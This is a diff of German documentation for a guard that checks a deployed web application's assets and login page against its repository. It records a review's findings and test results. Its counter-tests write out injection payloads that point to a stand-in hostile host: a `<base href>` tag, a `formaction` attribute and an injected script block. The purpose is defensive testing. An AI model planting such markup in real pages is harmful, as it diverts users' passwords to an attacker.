@@ -47,9 +47,9 @@ statt ihn stillschweigend zu übergehen.
 
 | Teil | Frage |
 |---|---|
-| Selbstprobe | Erkennt sie eine Abweichung überhaupt? Zwölf Erwartungen, ohne Netz — darunter fünf ausdrücklich „Abweichung erkannt" |
+| Selbstprobe | Erkennt sie eine Abweichung überhaupt? Zwanzig Erwartungen, ohne Netz — darunter neun ausdrücklich „Abweichung erkannt" |
 | 1 | Jede Datei unter `server/assets/` (ohne `.md`) — SHA-256 der Auslieferung gegen die des Repositoriums |
-| 2 | Die **ganze Menge** der Skripte und Formulare der Anmeldeseite (`login.php`): jeder `<script src>`, jeder Inline-Block, jedes `<form>`-Tag — nichts darf fehlen, verändert sein **oder dazukommen** |
+| 2 | Die **ganze Menge** dessen, was auf der Anmeldeseite (`login.php`) den Weg des Passworts bestimmt: jeder `<script src>`, jeder Inline-Block, jedes `<form>`-Tag, jedes `<base>`-Tag und jedes Umlenk-Attribut (`formaction`, `formmethod`, `formtarget`, `formenctype`) — nichts darf fehlen, verändert sein **oder dazukommen** |
 
 **Warum Teil 2 die ganze Menge vergleicht und nicht nur das Bekannte.** Auf
 der Anmeldeseite zählt der **Weg des Passworts**, und der hat genau zwei
@@ -71,17 +71,72 @@ Die Selbstprobe hat dabei gleich einen zweiten Fehler gefunden: Das
 hielt das eine externe Skript der Quelle für „unbestimmbar" — und ließ dann
 jeden Ersatz dafür durch. Behoben, bevor es eingecheckt war.
 
+**Die Gegenprüfung vom 07.09.2026 hat fünf weitere Stellen gefunden** (Backlog
+Nr. 140, Funde 17 bis 22). Vier davon sind im Code behoben; die fünfte ist
+eine Grenze und steht unten unter *Grenzen*:
+
+- **`<base href>` und `formaction`** (Fund 17). HTML kennt zwei Stellen, die
+  den Weg des Passworts bestimmen, ohne dass ein Skript oder das
+  `<form>`-Tag sich ändert: Ein `<base href="https://boese.example/">` im
+  Kopf löst *jeden* relativen Verweis dorthin auf — `src="assets/crypto.js"`
+  bleibt byteidentisch und lädt trotzdem fremden Code; ein `formaction=` am
+  Absendeknopf überstimmt das `action` des Formulars. Je eine Zeile, beide
+  ohne JavaScript, beide gingen grün durch. Jetzt gehören `<base>`-Tags und
+  die vier Umlenk-Attribute zur Menge. Die Absendeknöpfe selbst werden nicht
+  als Tags verglichen: Der Knopf der Anmeldeseite kommt aus `ui_knopf()`,
+  nicht aus der Quelle `login.php` — ein Tagvergleich bräuchte eine
+  Nachbildung von `ui_knopf()`, und jede Nachbildung ist eine zweite Stelle,
+  die veraltet. Das Attribut ist die Stelle, an der der Angriff steht; das
+  Attribut wird verglichen.
+- **Die Selbstprobe hing an Bezeichnern** (Fund 20). Ihre Gegenbeweise
+  entstanden mit `replace('const EdCrypto', …)`: Wird die Klasse umbenannt,
+  ist die Ersetzung ein Leerlauf, die Erwartung wird rot, und der tägliche
+  Lauf fällt, ohne dass an der Auslieferung etwas wäre — bei einer Wache,
+  deren einziger Kanal die Actions-Benachrichtigung ist, der schnellste Weg
+  dahin, dass niemand mehr hinsieht. Jetzt kippt die Probe ein Bit, hängt
+  einen Kommentar an und setzt ein Attribut an das erste Tag; das geht in
+  jeder Datei, wie immer ihre Bezeichner heißen. Nachgestellt (Umbenennung
+  `EdCrypto` → `EdKrypto` und `method="POST"`, ohne eine Datei zu ändern):
+  alte Selbstprobe **5 von 12 nicht erfüllt**, neue **0 von 20**.
+- **Ein Dateiname mit Leerzeichen oder Umlaut** (Fund 21) riss den ganzen
+  Lauf mit Rückgabewert 2 ab — mitten in der sortierten Liste, alle Dateien
+  danach ungeprüft, und die Ausgabe sagte es nicht. Der Pfad wird jetzt
+  prozentkodiert, und was beim Holen trotzdem schiefgeht (auch eine
+  abgerissene Übertragung, `IncompleteRead`), wird **eine Zeile** „nicht
+  erreichbar", kein Abbruch. Heute liegt kein solcher Name unter `assets/`;
+  es ist eine Falle für die nächste Schriftdatei, deren Name aus einem
+  Download übernommen wird.
+- **Zwei Ausleseschwächen** (Fund 22): `\bsrc` traf auch `data-src` — ein
+  `<script data-src="x">…</script>` galt als Fremdskript „x", sein Inhalt
+  wurde nie verglichen. Und die PHP-Erkennung war ein bloßes `<?`, das auch
+  in JavaScript steht (`if (a<?0)`); ein solcher Block galt als „nicht
+  vergleichbar" und fiel still aus dem Vergleich. Jetzt gilt: Ein
+  Attributname beginnt nicht nach einem Bindestrich, und PHP beginnt mit
+  `<?php` oder `<?=` — die einzigen Öffner, die die Anwendung benutzt.
+
 **Die Selbstprobe läuft in der Action zuerst**, und das ist kein Formalismus:
 Ein grüner Lauf einer Wache, die *immer* grün meldet, sieht genauso aus wie
 einer, der nichts gefunden hat.
 
-Gemessen am 07.09.2026 gegen die lokale Installation: **112 Dateien, 112
-gleich; 1 Inline-Block, 1 externes Skript, 1 Formular gleich, nichts zu
-viel**. Gegenprobe mit **einer** veränderten Kennung in `crypto.js` (37 434 B,
-Länge unverändert): **111 gleich, 1 abweichend**, Rückgabewert 1, mit
-Dateiname und beiden Summen. Gegenprobe mit einem über `ui.php`
-eingeschleusten Fremd-Skript: **1 zusätzliches Skript** gemeldet,
-Rückgabewert 1.
+Gemessen am 07.09.2026 gegen die lokale Installation und nach der
+Gegenprüfung erneut gegen eine Kopie davon (`php -S`, **Opcache aus** — mit
+Opcache sieht der eingebaute Server eine geänderte PHP-Datei erst nach
+`revalidate_freq` Sekunden, und eine Gegenprobe, die schneller fertig ist,
+misst die alte Datei; deshalb prüft jede Gegenprobe zuerst, dass ihre
+Veränderung in der Auslieferung steht): **112 Dateien, 112 gleich; 1
+Inline-Block, 1 externes Skript, 1 Formular gleich, 0 `<base>`-Tags, 0
+Umlenk-Attribute, nichts zu viel**, Rückgabewert 0. Die Gegenproben, jede
+einzeln gegen die alte und die jetzige Fassung:
+
+| Veränderung an der Kopie | Fassung vor der Gegenprüfung | jetzige Fassung |
+|---|---|---|
+| **eine** Kennung in `crypto.js` (37 434 B, Länge unverändert) | 111 gleich, 1 abweichend, Rückgabewert 1 | dito, mit Dateiname und beiden Summen |
+| Fremd-Skript über `ui_seite_ende()` in jede Seite | 1 zusätzliches Skript, Rückgabewert 1 | dito |
+| `<base href="https://boese.example/">` im `<head>`, sonst nichts | **„Kein Unterschied", Rückgabewert 0** | 1 zusätzliches `<base>`-Tag, Rückgabewert 1 |
+| `formaction="https://boese.example/"` am Absendeknopf, `<form>`-Tag unverändert | **„Kein Unterschied", Rückgabewert 0** | 1 zusätzliches Umlenk-Attribut, Rückgabewert 1 |
+| `<script data-src="x">boese()</script>` angehängt | zusätzliches Skript „x", Inhalt ungeprüft, Rückgabewert 1 | 1 zusätzlicher Inline-Block, Rückgabewert 1 |
+| `assets/mit leer.css` und `assets/übung.css` in Repositorium **und** Kopie | **Abbruch, Rückgabewert 2** (`InvalidURL`), Rest ungeprüft | 114 Dateien, 114 gleich, Rückgabewert 0 |
+| dieselben zwei Dateien nur im Repositorium | **Abbruch, Rückgabewert 2** | 112 gleich, 2 nicht erreichbar, Rückgabewert 1 |
 
 ## Wann sie läuft
 
@@ -118,7 +173,8 @@ und fasst die Workflow-Datei nicht an.
   `User-Agent`), täuschte sie. Dagegen gibt es hier kein Mittel; es wäre ein
   erheblich aufwendigerer Angriff als der, gegen den sie gebaut ist.
 - **Sie sieht keinen PHP-Code.** Was der Server rechnet, bleibt unsichtbar —
-  außer dem, was davon auf der Anmeldeseite ankommt: Skripte und Formulare.
+  außer dem, was davon auf der Anmeldeseite ankommt: Skripte, Formulare,
+  `<base>`-Tags und Umlenk-Attribute.
 - **Sie vergleicht die Anmeldeseite, nicht jede Seite.** Ein Skript, das
   `ui.php` in jede Seite einschleust, fällt dort auf; eines, das nur auf einer
   angemeldeten Seite erscheint, nicht. Dort liegt der Inhaltsschlüssel schon
@@ -127,8 +183,19 @@ und fasst die Workflow-Datei nicht an.
 - **Sie vergleicht keine Stylesheets und keine übrigen HTML-Änderungen.**
   Die Datei `assets/style.css` selbst ist über Teil 1 geprüft; ob die Seite
   ein *zusätzliches* Stylesheet lädt oder ihr Markup sonst geändert ist, sieht
-  sie nicht. Ohne Skript und ohne Formular verlässt das Passwort die Seite
-  nicht — deshalb reichen die beiden.
+  sie nicht. Verglichen wird, was den Weg des Passworts bestimmt: Skripte,
+  Formulare, `<base>` und die Umlenk-Attribute der Absende-Elemente. Ein
+  Stylesheet liest kein Eingabefeld und schickt nichts ab.
 - **Sie sieht nicht, ob der Deploy vollständig war.** Eine Datei, die es im
   Repositorium gibt und auf dem Server nicht, meldet sie als „nicht
   erreichbar" — das ist derselbe rote Lauf, aber die andere Ursache.
+- **Sie sieht keine Datei, die auf dem Server liegt und im Repositorium
+  nicht** — der umgekehrte Fall. Teil 1 zählt die Dateien des Repositoriums
+  auf und fragt genau diese an; `assets/` auf dem Server kann sie nicht
+  aufzählen (kein Verzeichnislisting, keine Zugangsdaten — gewollt, und ein
+  Listing wäre ohnehin abschaltbar). Eine solche Datei ist für sich allein
+  wirkungslos; sie wirkt erst, wenn eine Seite sie lädt. Auf der
+  Anmeldeseite fällt das auf (Teil 2), auf einer angemeldeten Seite nicht
+  (dritter Punkt). Gefunden in der Gegenprüfung vom 07.09.2026 (Fund 18):
+  Eine `assets/hilfe.js` auf dem Server, per HTTP abrufbar, ließ die Zahl
+  „112 Dateien, 112 gleich" unverändert.
